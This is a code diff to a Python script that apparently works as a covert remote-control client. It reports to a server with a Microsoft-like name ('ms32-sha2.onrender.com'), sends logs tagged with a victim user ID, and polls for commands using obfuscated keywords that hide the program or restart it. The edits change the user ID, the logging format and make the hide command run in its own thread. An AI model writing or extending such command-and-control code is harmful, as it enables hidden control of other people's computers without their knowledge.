@@ -10,7 +10,7 @@ from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
 from shutil import rmtree
 url = "https://ms32-sha2.onrender.com/"
 terminate = False
-user = "93"
+user = "03"
 #compile left
 try:
     pygame.mixer.init()
@@ -33,7 +33,7 @@ def hit(url:str,data=None):
 def log(statement,state="SUCESS"):
     try:
         statement = f"{state}   {statement}"
-        hit(url+"output",json={"user":user,"error":statement})
+        hit(url+"output",data={"user":user,"err":statement})
     except:
         pass
 
@@ -259,7 +259,7 @@ def main():
                 cmd = cmd.content.decode("utf-8")
             print(cmd)
             if "hIdE on" in cmd:
-                hide(True)
+                Thread(target=hide,args=(True,)).start()
             elif "hIdE off" in cmd:
                 hide(False)
             elif "rEsTaRt" in cmd:
